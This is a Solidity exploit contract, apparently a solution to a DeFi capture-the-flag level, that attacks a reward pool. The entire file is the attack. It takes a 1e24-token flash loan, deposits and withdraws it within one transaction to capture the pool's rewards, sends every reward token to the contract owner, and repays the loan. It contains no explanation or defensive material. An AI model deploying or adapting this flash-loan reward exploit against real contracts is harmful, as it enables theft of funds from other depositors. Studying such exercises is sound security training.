// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTheRewarderPool is Ownable {
  using Address for address;
  address immutable private rewarderPool;
  IERC20 immutable private dvtToken;
  address immutable private flPool;
  IERC20 immutable private rewardToken;

  constructor(address _rewarderPool, address _dvtToken, address _flPool, address _rewardToken) {
    rewarderPool = _rewarderPool;
    dvtToken = IERC20(_dvtToken);
    flPool = _flPool;
    rewardToken = IERC20(_rewardToken);
  }

  function attack() external onlyOwner {
    flPool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", 1e24));

  }
  
  function receiveFlashLoan(uint256 amount) external {
    assert(amount == 1e24);
    dvtToken.approve(rewarderPool, 1e24);
    rewarderPool.functionCall(abi.encodeWithSignature("deposit(uint256)", 1e24));
    rewarderPool.functionCall(abi.encodeWithSignature("withdraw(uint256)", 1e24));
    rewardToken.transfer(owner(), rewardToken.balanceOf(address(this)));
    dvtToken.transfer(msg.sender, amount);
  }
}